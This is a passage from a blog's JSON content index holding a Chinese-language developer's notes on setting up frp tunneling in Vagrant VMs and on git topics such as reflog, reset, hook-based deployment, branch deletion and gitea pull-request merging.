class=\"built_in\">cd</span> /vagrant/frp</span><br><span class=\"line\">./frps -c frps.ini</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://192.168.50.2:7500\" target=\"_blank\" rel=\"noopener\">http://192.168.50.2:7500</a> 有看到畫面就是成功了</p>\n<h2 id=\"port-轉發\"><a href=\"#port-轉發\" class=\"headerlink\" title=\"port 轉發\"></a>port 轉發</h2><h3 id=\"client-設定\"><a href=\"#client-設定\" class=\"headerlink\" title=\"client 設定\"></a>client 設定</h3><p>安裝 apache2 簡單做</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 進去client1 </span></span><br><span class=\"line\">vagrant ssh frp-client1</span><br><span class=\"line\"><span class=\"comment\"># 安裝 apache2</span></span><br><span class=\"line\">sudo apt install apache2</span><br><span class=\"line\">curl localhost</span><br><span class=\"line\"><span class=\"comment\"># 看到web內容就是完成了</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cp frpc.ini frpc1.ini</span><br><span class=\"line\">vim frpc1.ini</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight ini\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">server_addr</span> = <span class=\"number\">192.168</span>.<span class=\"number\">50.2</span></span><br><span class=\"line\"><span class=\"attr\">server_port</span> = <span class=\"number\">7000</span></span><br><span class=\"line\"><span class=\"attr\">token</span> = abcd1234567890</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[web]</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = tcp</span><br><span class=\"line\"><span class=\"attr\">local_ip</span> = <span class=\"number\">127.0</span>.<span class=\"number\">0.1</span></span><br><span class=\"line\"><span class=\"attr\">local_port</span> = <span class=\"number\">80</span></span><br><span class=\"line\"><span class=\"attr\">remote_port</span> = <span class=\"number\">8080</span></span><br></pre></td></tr></table></figure>\n<p>這邊沒用type= http ，因為 http 需要加<code>custom_domains = 192.168.50.2</code>樣子<br>http我好像會失敗，我先不用設定這麼麻煩<br>可以看一下<a href=\"https://zhuanlan.zhihu.com/p/150650291\" target=\"_blank\" rel=\"noopener\">利用FRP穿透到内网的http/https网站，实现对外开放 - 知乎</a><br>vhost_http_port也要設定<br>我就懶得測試了</p>\n<h2 id=\"hfs\"><a href=\"#hfs\" class=\"headerlink\" title=\"hfs\"></a>hfs</h2><p>之前進去 frpc 就懶得寫了</p>\n<figure class=\"highlight ini\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[common]</span></span><br><span class=\"line\"><span class=\"attr\">server_addr</span> = <span class=\"number\">192.168</span>.<span class=\"number\">50.2</span></span><br><span class=\"line\"><span class=\"attr\">server_port</span> = <span class=\"number\">7000</span></span><br><span class=\"line\"><span class=\"attr\">token</span> = abcd1234567890</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"section\">[test_static_file]</span></span><br><span class=\"line\"><span class=\"attr\">type</span> = tcp</span><br><span class=\"line\"><span class=\"attr\">remote_port</span> = <span class=\"number\">8081</span></span><br><span class=\"line\"><span class=\"attr\">plugin</span> = static_file</span><br><span class=\"line\"><span class=\"comment\"># 要对外暴露的文件目录</span></span><br><span class=\"line\"><span class=\"attr\">plugin_local_path</span> = /tmp</span><br><span class=\"line\"><span class=\"comment\"># 用户访问 URL 中会被去除的前缀，保留的内容即为要访问的文件路径</span></span><br><span class=\"line\"><span class=\"attr\">plugin_strip_prefix</span> = static</span><br><span class=\"line\"><span class=\"attr\">plugin_http_user</span> = abc</span><br><span class=\"line\"><span class=\"attr\">plugin_http_passwd</span> = abc</span><br></pre></td></tr></table></figure>\n<p><a href=\"http://192.168.50.2:8081/static/\" target=\"_blank\" rel=\"noopener\">http://192.168.50.2:8081/static/</a><br>就可以進去了</p>\n<p>其實仔細想想好像不需要太多 frp-client<br>frpc可以同一台 server可以開很多…</p>\n<h2 id=\"其他官網教學\"><a href=\"#其他官網教學\" class=\"headerlink\" title=\"其他官網教學\"></a>其他官網教學</h2><ul>\n<li><a href=\"https://gofrp.org/docs/examples/https2http/\" target=\"_blank\" rel=\"noopener\">为本地 HTTP 服务启用 HTTPS | frp</a></li>\n<li><a href=\"https://gofrp.org/docs/examples/stcp/\" target=\"_blank\" rel=\"noopener\">安全地暴露内网服务 | frp</a></li>\n<li><a href=\"https://gofrp.org/docs/examples/xtcp/\" target=\"_blank\" rel=\"noopener\">点对点内网穿透 | frp</a></li>\n</ul>\n<p>因為目前沒有要使用<br>本來想要寫 stcp<br>不過這個跟 ssh tunnel 差不多<br>之前有記錄這篇<a href=\"https://malagege.github.io/blog/2018/12/13/ssh-port-forward%E9%80%A3MySQL%E6%96%B9%E6%B3%95/\">ssh port forward連MySQL方法(SSH Tunnel) | 程式狂想筆記</a><br>看上面教學還滿簡單了，這邊就不整理了</p>\n<h2 id=\"相關文章\"><a href=\"#相關文章\" class=\"headerlink\" title=\"相關文章\"></a>相關文章</h2><ul>\n<li><a href=\"https://github.com/MvsCode/frps-onekey\" target=\"_blank\" rel=\"noopener\">MvsCode/frps-onekey: Frps 一键安装脚本&amp;管理脚本 A tool to auto-compile &amp; install frps on Linux</a></li>\n<li><a href=\"https://hsk.oray.com/news/8583.html\" target=\"_blank\" rel=\"noopener\">免费frp公共服务器列表是什么？花生壳轻松实现ftp服务-oray贝锐科技花生壳官网</a></li>\n<li><a href=\"https://freenat.ml/\" target=\"_blank\" rel=\"noopener\">免费FRP内网穿透服务</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/150740136\" target=\"_blank\" rel=\"noopener\">“远程办公” 整体解决方案-内网穿透 - 知乎</a></li>\n</ul>\n","categories":["frp","traefik","ssh tunnel"],"tags":["實用工具"]},{"title":"git difff 出現old mode 100755 new mode 100644","url":"/blog/2019/04/24/git-difff-%E5%87%BA%E7%8F%BEold-mode-100755-new-mode-100644/","content":"<p>最近遇到 git 沒有變動的檔案<br>發現狀態跑出更動檔案<br>找了一下解決方法</p>\n<a id=\"more\"></a>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ git diff code.c</span><br><span class=\"line\">old mode 100755</span><br><span class=\"line\">new mode 100644</span><br></pre></td></tr></table></figure>\n<p>這原因應該是 Linux、Window、Mac 之間檔案複製到不同台電腦做 git commit<br>可能會遇到的問題</p>\n<p><code>git config core.filemode false</code><br>解決問題</p>\n<p>在看情形是不是要全域做設定</p>\n<p>參考來源:</p>\n<ul>\n<li><a href=\"https://www.jianshu.com/p/3b0a9904daca\" target=\"_blank\" rel=\"noopener\">git tips: 设置 filemode，避免 NTFS 文件权限变更引起的修改 - 简书</a></li>\n<li><a href=\"https://my.oschina.net/xhan/blog/493454\" target=\"_blank\" rel=\"noopener\">git file mode change - 晓寒的个人空间 - OSCHINA</a></li>\n<li><a href=\"https://stackoverflow.com/questions/1257592/how-do-i-remove-files-saying-old-mode-100755-new-mode-100644-from-unstaged-cha\" target=\"_blank\" rel=\"noopener\">git gui - How do I remove files saying “old mode 100755 new mode 100644” from unstaged changes in Git? - Stack Overflow</a></li>\n<li><a href=\"https://my.oschina.net/xhan/blog/493454\" target=\"_blank\" rel=\"noopener\">git file mode change - 晓寒的个人空间 - OSCHINA</a></li>\n</ul>\n<p>最近沒有時間整理這些資料<br>先預留 NOTE:<br>(sharding DB 不太能做 join)</p>\n<ul>\n<li><a href=\"https://blog.csdn.net/bluishglc/article/details/6161475\" target=\"_blank\" rel=\"noopener\">数据库 Sharding 的基本思想和切分策略 - Laurence 的技术博客 - CSDN 博客</a></li>\n<li><a href=\"https://www.jianshu.com/p/6ebafabfddae\" target=\"_blank\" rel=\"noopener\">MySQL Sharding 详解 - 简书</a></li>\n<li><a href=\"http://database.51cto.com/art/201809/583857.htm\" target=\"_blank\" rel=\"noopener\">MySQL 分库分表，写得太好了！ - 51CTO.COM</a></li>\n<li><a href=\"https://blog.gslin.org/archives/2017/02/02/7113/mysql-%E4%B8%8A-sharding-%E7%9A%84%E6%96%B9%E6%A1%88/\" target=\"_blank\" rel=\"noopener\">MySQL 上 sharding 的方案 | Gea-Suan Lin’s BLOG</a></li>\n<li><a href=\"http://dbase.cc/2018/02/27/docker/08_%E4%BD%BF%E7%94%A8Rancher-pipeline%E6%90%AD%E5%BB%BA%E5%9F%BA%E4%BA%8E%E5%AE%B9%E5%99%A8%E7%9A%84CICD/\" target=\"_blank\" rel=\"noopener\">Docker 学习笔记_08 使用 Rancher pipeline 搭建基于容器的 CICD | 一个 DBA 的工作学习笔记</a></li>\n<li><a href=\"https://darylliu.github.io/2019/04/12/hexo%E4%B8%AA%E4%BA%BAnext%E4%B8%BB%E9%A2%98%E5%8D%9A%E5%AE%A2%E6%8E%A5%E5%85%A5%E8%B0%B7%E6%AD%8C%E5%B9%BF%E5%91%8A/\" target=\"_blank\" rel=\"noopener\">hexo 个人 next 主题博客接入谷歌广告 | Daryl’s Blog</a></li>\n</ul>\n"},{"title":"git log簡單用法筆記","url":"/blog/2018/08/17/git-log%E7%B0%A1%E5%96%AE%E7%94%A8%E6%B3%95%E7%AD%86%E8%A8%98/","content":"<p>最近學會使用<code>git log</code><br>但怕很久沒用就會忘了<br>簡單記錄一下</p>\n<a id=\"more\"></a>\n<p><strong>Git branch(分支)是一個pointer概念</strong><br>通常習慣用<code>gitk</code>看分支圖片<br>再不會可以用<code>TortoiseGit</code>和<code>sourcetree</code><br>在下兩個都不排斥<br>但是sourcetree安裝時候要登入帳號密碼<br>所以我沒有在公司用了</p>\n<p>但今天不是要講gui界面多好用<br>你會看<code>git log  --graph --oneline</code><br>就可以省略看GUI界面</p>\n<p>平常在分之底下看<code>git log</code>，一開始覺得奇怪怎麼不顯示全部分支<br><strong>事後懂了git branch是一個pointer概念</strong><br>覺得看全部真的沒有意義(應該正常需求不會看到)<br>全部看到會覺得太亂<br>通常在這條分支看過去紀錄，反正merge過後<code>git log</code>都看到<br>真的沒必要多個<code>--all</code></p>\n<p>PS:看圖<code>--graph</code></p>\n<p><code>--oneline</code>顯示一行，英文就是<code>one line</code>和在一起</p>\n<p><code>-p -(n)</code>秀diff 程式碼</p>\n<blockquote>\n<p>$ git log -p -2<br>最常用的選項之一為 -p，用來顯示每個更新之間差別的內容。 另外還可以加上 -2 參數，限制為只輸出最後兩個更新。</p>\n</blockquote>\n<p>通常也不用死記<br><code>git bash</code>tab 可以自動autocomplete<br>(工程師沒辦法記太多東西&gt;.&lt;)</p>\n<p>剛開始看不是很懂<code>git log</code>全部分支<br>但自從懂git branch是pointer概念<br>就開竅了XDD</p>\n<p>參考來源:<br><a href=\"https://git-scm.com/book/zh-tw/v1/Git-%E5%9F%BA%E7%A4%8E-%E6%AA%A2%E8%A6%96%E6%8F%90%E4%BA%A4%E7%9A%84%E6%AD%B7%E5%8F%B2%E8%A8%98%E9%8C%84\" target=\"_blank\" rel=\"noopener\">Git - 檢視提交的歷史記錄</a></p>\n","categories":["Git"],"tags":["git","log"]},{"title":"git merge master 常常遇到衝突的雷","url":"/blog/2018/08/09/git-merge-master-%E5%B8%B8%E5%B8%B8%E9%81%87%E5%88%B0%E8%A1%9D%E7%AA%81%E7%9A%84%E9%9B%B7/","content":"<p>最近之前學會fetch 跟merge 線上git分支<br>但最近開發偶爾會遇到衝突<br>而且還是幫我推git的人到正式環境裡面同樣我改的commit衝突(他用cherry-picker)<br>突然覺得我有什麼觀念不對</p>\n<a id=\"more\"></a>\n<p>PS:公司只有用master一條</p>\n<p>就請叫我同事，他怎麼避免這個問題<br>他說他會開分支，但自己分支完不會合併到自己master上面<br>然後master不要做任何commit，他只做更新動作<br>分支都從master出來，改程式都需要在自己建立的分支<br>改完一樣給推git的人commit id</p>\n<p>他更新完，就可以更新(pull) remote master分支<br>這樣不會衝突</p>\n<p>PS:  cherry-pick出來的commit會不一樣</p>\n<p>雖然這不是gitflow，但還是先了解git<br>知道使用方式才是正確的<br>等下次有機會使用新的專案<br>可以自己用用看<br><a href=\"https://medium.com/kuma%E8%80%81%E5%B8%AB%E7%9A%84%E8%BB%9F%E9%AB%94%E5%B7%A5%E7%A8%8B%E6%95%99%E5%AE%A4/%E5%9F%BA%E7%A4%8E-git-flow-%E5%B7%A5%E4%BD%9C%E6%B3%95-fa50b1dddc4f\" target=\"_blank\" rel=\"noopener\">Git怎麼這麼難用？Git Flow + 好習慣 = 不再苦惱 – Kuma老師的軟體工程教室 – Medium</a></p>\n<p>最後還煩腦commit message要怎麼寫才比較不會亂<br>很迷茫的去看vscode裡面的git，裡面分支好多又好亂(可能是我不會看)<br>Google有爬到好文<a href=\"https://blog.louie.lu/2017/03/21/%E5%A6%82%E4%BD%95%E5%AF%AB%E4%B8%80%E5%80%8B-git-commit-message/\" target=\"_blank\" rel=\"noopener\">如何寫一個 Git Commit Message | louie_lu’s blog</a><br>裡面說可以去看linux和git<br>linux的git好大<br>所以我只看git<br>git分支不多，會看到很多一點做merge<br>對我而言是整齊的<del>亂</del>XD</p>\n<p>GIT真的可以用很活，但是用不好感覺很容易爆炸</p>\n","categories":["Git"],"tags":["git"]},{"title":"git reset 和git reflog小記","url":"/blog/2018/11/09/git-reset-%E5%92%8Cgit-reflog%E5%B0%8F%E8%A8%98/","content":"<p>最近在改程式，所以我重新上一個commit<code>git commit --amend</code><br>但做完發現…，我忘記做<code>git add xxx</code>了<br>當下<code>Ctrl+C</code>都不能中斷<br>只能QQ<code>:q!</code>or<code>:qa!</code></p>\n<a id=\"more\"></a>\n<p>這種事當然要找一下解法</p>\n<h2 id=\"git-reflog\"><a href=\"#git-reflog\" class=\"headerlink\" title=\"git reflog\"></a>git reflog</h2><p><code>git reflog</code>指令可以看最近刪除commit，之後會被自動刪除<br>可依照commit說明去找上次的內容</p>\n<p>這時候想看reflog內容要怎麼看??<br>這時候要用之前學得融會貫通XD<br><code>git checkout commit_id</code><br>這樣就能切換過去<br>再<code>git diff</code>也能看到東西</p>\n<h2 id=\"git-reset\"><a href=\"#git-reset\" class=\"headerlink\" title=\"git reset\"></a>git reset</h2><p><code>git reset --hard commit_id</code></p>\n<p>這樣就檢單還原</p>\n<p>git reset –soft<br>git reset –mixed<br>不過這指令記不時起來</p>\n<p>2018-11-12<br><a href=\"https://youtu.be/Hl4tuzqaFJk?t=3843\" target=\"_blank\" rel=\"noopener\">大師常來聊-高見龍談 Git 版控之final12345</a><br>剛好最近寫這篇，剛好沒說很熟git reset，腦還中對這個印象沒有運作的概念<br>今天剛好聽知這段，<code>goto,become</code>會比較容易理解</p>\n<p><a href=\"https://youtu.be/Hl4tuzqaFJk?t=5999\" target=\"_blank\" rel=\"noopener\">大師常來聊-高見龍談 Git 版控之final12345 - rebase合併</a> </p>\n<p><a href=\"https://youtu.be/Hl4tuzqaFJk?t=9141\" target=\"_blank\" rel=\"noopener\">大師常來聊-高見龍談 Git 版控之final12345 - git flow </a></p>\n<p><a href=\"https://youtu.be/Hl4tuzqaFJk?t=7509\" target=\"_blank\" rel=\"noopener\">大師常來聊-高見龍談 Git 版控之final12345 - git 沒模組化很容易衝突</a><br>在沒做模組拆分很容易發生衝突，如:index.html</p>\n<p><a href=\"https://youtu.be/Hl4tuzqaFJk?t=7887\" target=\"_blank\" rel=\"noopener\">大師常來聊-高見龍談 Git 版控之final12345 - git checkout file 跟 git reset HEAD –mixed 差別</a></p>\n<p><a href=\"https://youtu.be/Hl4tuzqaFJk?t=8806\" target=\"_blank\" rel=\"noopener\">大師常來聊-高見龍談 Git 版控之final12345 - git PR 遇到衝突</a></p>\n<p>其實下面兩個問題是我問題，希望之後實務上會用git更順利<br>基本上有基礎，再看那個直播會更容易了解<br>會看那個直播是剛好有買<code>為了你自己學git</code>，覺得書中內容不錯<br>剛好參加Kuro研討會順便去天龍書店逛的<br>好書!!就直接買了XD</p>\n<p>FB有看到簡易了解圖示<br><a href=\"https://www.facebook.com/photo.php?fbid=2418041491555969&amp;set=gm.1944599088922083&amp;type=3&amp;theater&amp;ifg=1\" target=\"_blank\" rel=\"noopener\">謝孟哲 - [git reset …] 問題很簡單，有辦法把 cache 的內容寫回 working directory 嗎？…</a></p>\n<img src=\"/blog/2018/11/09/git-reset-和git-reflog小記/1.jpg\" title=\"簡易圖示\">\n<p>一直以為<code>git reflog</code>很難，一直沒有跨出這一步…<br>但是今天遇到這個狀況，卻不小心邁進一大步XD</p>\n","categories":["Git"],"tags":["git"]},{"title":"git push簡單自動部屬程式方法","url":"/blog/2018/12/15/git-push%E7%B0%A1%E5%96%AE%E8%87%AA%E5%8B%95%E9%83%A8%E5%B1%AC%E7%A8%8B%E5%BC%8F%E6%96%B9%E6%B3%95/","content":"<p>其實最近想git有甚麼好方法做部屬動作<br>蒐集網路一些方法<br>都是<code>delete all file</code>再刪除….<br>但感覺這種作法，會讓服務中斷<br>有想到用<code>git pull</code>更新方法<br>但Server Web目錄會有git<br>雖然有想到用git方法<br>不過最終有找到不錯的做法</p>\n<a id=\"more\"></a>\n<h2 id=\"Git-如何針對其他路徑下的-Repository-執行指令\"><a href=\"#Git-如何針對其他路徑下的-Repository-執行指令\" class=\"headerlink\" title=\"Git 如何針對其他路徑下的 Repository 執行指令\"></a>Git 如何針對其他路徑下的 Repository 執行指令</h2><p>最近剛好看到這篇<br><code>git -–git-dir={專案路徑}.git\\ -–work-tree={專案路徑} {git 指令}</code><br>看到這個舊感覺能用在git簡單部屬上面</p>\n<p>所以就稍微在我Linux電腦主機上面玩了一下</p>\n<p>簡單原理<code>git-dir</code>運用在git 資料夾，這邊範例是<code>.git</code>結尾<br>我一開始以為一定要用<code>bare</code><br>但後來發現，除了可以用<code>bare</code>當git<br>還能用一般<code>project_dir/.git/</code></p>\n<p>work-tree 就是要對應其路徑</p>\n<p>看到這個就能感覺輕鬆部屬<br>.git/hooks/post-receive<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># !/bin/sh</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># checkout HEAD</span></span><br><span class=\"line\">git --get-dir=xxxxx/.git/ --work-tree=xxxx(部屬位置) checkout -f</span><br></pre></td></tr></table></figure></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">chmod +x .git/hooks/post-receive</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://buddy.works/blog/how-deploy-projects-with-git\" target=\"_blank\" rel=\"noopener\">How to deploy projects with Git - Buddy</a><br>雖然感覺也是能用<code>git reset --hard head</code><br>不過網路上用這個比較多<br>也有看到做之前<code>git checkout -f</code>做<code>git stash</code><br>雖然這篇是透過push git repo去做更新</p>\n<p>但我覺得不應該讓bare有兩個<br>改天push錯就GG  XD</p>\n<p>之前也有研究<a href=\"https://malagege.github.io/blog/2017/11/26/logdown/2017-11-26-3865744/\">用caddy-git使用webhook初體驗 | 程式狂想筆記</a><br>感覺可以運用這個上面<br><code>then        command [args...]</code>應該就可以做<code>git --get-dir=xxxxx/.git/ --work-tree=xxxx(部屬位置) checkout -f</code></p>\n<p>目前在想<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">dev_git --push--&gt;git reop --&gt; webhook --&gt; caddy webhook --&gt; git deploy</span><br></pre></td></tr></table></figure></p>\n<p>當然這邊只能做不需要編譯的部屬<br>例如PHP應該能這樣做<br>說不定哪天就有機會可以用到</p>\n<p><strong>2019-12-16</strong></p>\n<p>最近看到這篇 <a href=\"https://blog.zjyl1994.com/post/hugo-nginx-githook/\" target=\"_blank\" rel=\"noopener\">Hugo 博客折腾记 - 咸鱼的小鱼塘</a> 有Webhook 程式<br><a href=\"https://github.com/adnanh/webhook\" target=\"_blank\" rel=\"noopener\">adnanh/webhook: webhook is a lightweight incoming webhook server to run shell commands</a><br>簡單可以用 shell 部屬<br>但我還沒測試過<br>不知道同一個時間做 webhook ，會不會影響部屬?</p>\n<p>另類部屬方法<br><a href=\"https://segmentfault.com/a/1190000017527484\" target=\"_blank\" rel=\"noopener\">手摸手带你部署git服务器实现自动发布代码 - 个人文章 - SegmentFault 思否</a><br><a href=\"https://juejin.im/post/5d825725f265da03c34c335d\" target=\"_blank\" rel=\"noopener\">通过Git将Hexo博客部署到服务器 - 掘金</a><br>上面有寫到</p>\n<p>其他參考來源:</p>\n<ul>\n<li><a href=\"https://gitbook.tw/interview\" target=\"_blank\" rel=\"noopener\">Git 面試題 - Git 教學 | 高見龍</a></li>\n<li><a href=\"https://github.com/abiosoft/caddy-git\" target=\"_blank\" rel=\"noopener\">abiosoft/caddy-git: git middleware for Caddy</a></li>\n<li><a href=\"https://hant.helplib.com/GitHub/article_94904\" target=\"_blank\" rel=\"noopener\">simple-php-git-deploy,使用PHP和Git自動部署代碼,下載simple-php-git-deploy的源碼<em>GitHub</em>幫酷</a></li>\n<li><a href=\"https://codeday.me/bug/20181205/437453.html\" target=\"_blank\" rel=\"noopener\">从Git部署一个PHP项目到没有安装Git的服务器 - 代码日志</a></li>\n<li><a href=\"https://www.kancloud.cn/xiak/php-node/581828\" target=\"_blank\" rel=\"noopener\">安全的代码部署 · php笔记 · 看云</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/qZGVdNtCJOycR_sye9az6w?\" target=\"_blank\" rel=\"noopener\">SegmentFault</a></li>\n<li><a href=\"http://blog.caoxl.com/2018/06/14/Git-Server-Deploy/\" target=\"_blank\" rel=\"noopener\">git 服务器 搭建/自动部署/远程连接 | Caoxl’s Blog</a></li>\n<li><a href=\"http://imweb.io/topic/5b13aa38d4c96b9b1b4c4e9d\" target=\"_blank\" rel=\"noopener\">git hook实践心得 - 腾讯Web前端 IMWeb 团队社区 | blog | 团队博客</a></li>\n<li><a href=\"https://stackoverflow.com/questions/3596260/git-remote-add-with-other-ssh-port\" target=\"_blank\" rel=\"noopener\">git remote add with other SSH port - Stack Overflow</a></li>\n<li><a href=\"https://malagege.github.io/blog/2017/11/26/logdown/2017-11-26-3865744/\">用caddy-git使用webhook初體驗 | 程式狂想筆記</a></li>\n<li><a href=\"https://github.com/abiosoft/caddy-git\" target=\"_blank\" rel=\"noopener\">abiosoft/caddy-git: git middleware for Caddy</a></li>\n</ul>\n","categories":["Git"],"tags":["git"]},{"title":"git 刪除分支commit會留著?!","url":"/blog/2018/08/09/git-%E5%88%AA%E9%99%A4%E5%88%86%E6%94%AFcommit%E6%9C%83%E7%95%99%E8%91%97/","content":"<p>最近公司master merge一直出問題<br>有一直想到feature一直建立分支，需求爆多那不分支不是之後會越積越多<br>一直找不到答案<br>最後在<a href=\"https://ithelp.ithome.com.tw/articles/10138437\" target=\"_blank\" rel=\"noopener\">30 天精通 Git 版本控管 (17)：關於合併的基本觀念與使用方式 - iT 邦幫忙::一起幫忙解決難題，拯救 IT 人的一天</a>找到答案</p>\n<blockquote>\n<p>刪除不必要的分支<br>假設我們 feature 分支還會持續開發新功能，所以可以暫時將它留著，讓後續還能繼續切換到 feature 分支繼續開發。<br>如果你確定用不到的話，可以用 git branch -d feature 刪除該分支。<br>在 Git 裡，只要沒有執行過「合併」的分支，都不能用上述指令進行刪除，必須改用 git branch -D feature 才能刪除該分支。</p>\n</blockquote>\n<a id=\"more\"></a>\n<p>(在有merge過的分支)<br>刪除分支commit會留著<br>想建立回來刪除的branch<br>可以用checkout到之前的commit</p>\n<p>(在沒有merge過的分支)<br>刪除分支<br><code>git log --oneline --all</code><br>沒有看到commit   囧<br>我原本實驗以為是真的把commit刪掉<br>但是看<a href=\"https://gitbook.tw/chapters/branch/restore-deleted-but-unmerged-branch.html\" target=\"_blank\" rel=\"noopener\">【狀況題】不小心把還沒合併的分支砍掉了，救得回來嗎？ 為你自己學 Git</a><br>說明commit 不會馬上被刪掉，但有機會之後被git垃圾清除<br><a href=\"https://gitbook.tw/chapters/branch/about-merged-branch.html\" target=\"_blank\" rel=\"noopener\">【常見問題】合併過的分支要留著嗎？ 為你自己學 Git</a><br>我覺得是我需求完成結案就刪吧<br>又有需求再開新branch</p>\n<p>使用git branch<br>建出來的branch會在你現在的commit<br>真的是很神奇東西</p>\n<p>話說git我原本以為他是zip觀念<br>刪除整個commit都會不見<br>現在感覺他跟指標(point)很像(事後查到<a href=\"https://gitbook.tw/chapters/branch/restore-deleted-but-unmerged-branch.html\" target=\"_blank\" rel=\"noopener\">【狀況題】不小心把還沒合併的分支砍掉了，救得回來嗎？ 為你自己學 Git</a>裡面有寫到)<br>等等，他好像跟tag屬性重疊XD<br><a href=\"https://www.kenming.idv.tw/about_vc_branch_tag_difference/\" target=\"_blank\" rel=\"noopener\">關於版本控管系統的分支(branch)與標籤(tag)的區別 | Kenmingの鮮思維</a>這邊有簡單介紹<br>用法不太一樣</p>\n<p>但等等…怎麼知道有哪些branch已經合併<br>不可能用<code>gitk --all</code>肉眼看圖<br>爬文有找到<a href=\"https://git-scm.com/book/zh-tw/v1/Git-%E5%88%86%E6%94%AF-%E5%88%86%E6%94%AF%E7%9A%84%E7%AE%A1%E7%90%86\" target=\"_blank\" rel=\"noopener\">Git - 分支的管理</a><br>查詢合併分支<code>git branch --merged</code><br>查詢沒有合併分支<code>git branch --no-merged</code></p>\n<p><a href=\"https://zlargon.gitbooks.io/git-tutorial/content/branch/create_delete.html\" target=\"_blank\" rel=\"noopener\">建立 / 刪除分支 · Git</a><br><a href=\"https://blog.louie.lu/2016/08/26/delete-git-branch-local-and-remote-%e5%88%aa%e9%99%a4%e6%9c%ac%e5%9c%b0%e8%b7%9f%e9%81%a0%e7%ab%af-git-branch/\" target=\"_blank\" rel=\"noopener\">delete git branch local and remote (刪除本地跟遠端 git branch) | louie_lu’s blog</a><br><a href=\"https://www.jianshu.com/p/0fe715a7fbb3\" target=\"_blank\" rel=\"noopener\">怎么用git clone 远程的所有分支 - 简书</a></p>\n","categories":["Git"],"tags":["git"]},{"title":"gitea試玩合併分支(PR)","url":"/blog/2018/12/06/gitea%E8%A9%A6%E5%AE%8C%E5%90%88%E4%BD%B5%E5%88%86%E6%94%AF-PR/","content":"<p>最近試玩一下gitea<br>使用<code>choco install  gitea</code><br>順利安裝成功<br>預設第一個申請帳號會是管理者</p>\n<a id=\"more\"></a>\n<p>直接進入主題</p>\n<p>之前有在想PR後，分支會變成什麼狀況??<br>今天實驗用一般PR<br>合併PR會有兩條branch<br><img src=\"/blog/2018/12/06/gitea試完合併分支-PR/1.jpg\" title=\"合併PR會有兩條branch\"></p>\n<hr>\n<h2 id=\"gitea-合併分支有兩個選項\"><a href=\"#gitea-合併分支有兩個選項\" class=\"headerlink\" title=\"gitea 合併分支有兩個選項\"></a>gitea 合併分支有兩個選項</h2><p>PR還有兩種branch(rebase,squash)<br><img src=\"/blog/2018/12/06/gitea試完合併分支-PR/2.jpg\" title=\"另外兩種分支\"></p>\n<p>稍微google一下<br><a href=\"https://juejin.im/post/59c7b00df265da065e323acf\" target=\"_blank\" rel=\"noopener\">使用 git rebase 提高 PR 质量 - 掘金</a><br><a href=\"/blog/2018/12/06/gitea試完合併分支-PR/web.png\" title=\"備份圖\">備份圖</a></p>\n<p><del>不過我覺得PR在不傷commit情況下，一般合併應該就可以了</del></p>\n<p>由於最近在想公司</p>\n<h2 id=\"revert無法取笑merge-branch\"><a href=\"#revert無法取笑merge-branch\" class=\"headerlink\" title=\"revert無法取笑merge branch\"></a>revert無法取笑merge branch</h2><p>最近還發現revert不能取消merge branch<br>雖然我會用<code>git reset</code><br>但還是有找了一下<br><a href=\"https://segmentfault.com/q/1010000000140446\" target=\"_blank\" rel=\"noopener\">Git怎样撤销一次分支的合并Merge - SegmentFault 思否</a><br><a href=\"https://github.com/git/git/blob/master/Documentation/howto/revert-a-faulty-merge.txt\" target=\"_blank\" rel=\"noopener\">git/revert-a-faulty-merge.txt at master · git/git</a><br><a href=\"https://www.itread01.com/content/1531335500.html\" target=\"_blank\" rel=\"noopener\">git revert 讓提交不再害怕 - IT閱讀</a></p>\n<p>有機會情境用到來測試看看…</p>\n<h2 id=\"PR衝突解決方法\"><a href=\"#PR衝突解決方法\" class=\"headerlink\" title=\"PR衝突解決方法\"></a>PR衝突解決方法</h2><p>也有爬到PR可能會衝突解決辦法<br><del>不過還沒有實驗，先記錄</del></p>\n<p>經過實驗得到很驚奇的結果<br>PR假如會發生衝突，gitea或gitlab不會讓你做合併動作(按鈕會變灰色的)<br>但要如何修正呢</p>\n<p>當然就一般兩種</p>\n<ul>\n<li>merge<br>先加入fork remote的資訊，在做<code>master</code>做<code>git pull add_remote_name</code><br>正常會遇到衝突<br>就直接解這個問題(git merge –continue)<br>git push上去後，PR那個merge按鈕應該就可以按了</li>\n</ul>\n<p><strong>但這個有嚴重的缺點，會自動產生merge commit</strong><br>其實這也不是缺點，保留當下時間的commit也只有這個方法</p>\n<p>所以為了好看，大部分應該都會選擇rebase<br><a href=\"https://ihower.tw/blog/archives/3843\" target=\"_blank\" rel=\"noopener\">使用 git rebase 避免無謂的 merge | ihower { blogging }</a></p>\n<ul>\n<li>rebase<br>先加入fork remote的資訊，在做<code>master</code>做<code>git pull --rebase add_remote_name</code><br>正常會遇到衝突<br>就直接解這個問題(git rebase –continue)<br>正常你的repo應該只有你一個人<br>之前的commit會改變<br>可能需要<code>git push -f</code><br>但有多人的話<code>git push --force-with-lease</code><br>與多人衝突要怎麼辦??<br>這時候可能只能用<code>merge</code>方法，但如先前所說會有缺點<br><a href=\"https://walterlv.com/post/safe-push-using-force-with-lease.html\" target=\"_blank\" rel=\"noopener\">Git 更安全的强制推送，–force-with-lease - walterlv</a></li>\n</ul>\n<p>相關資料:</p>\n<ul>\n<li><a 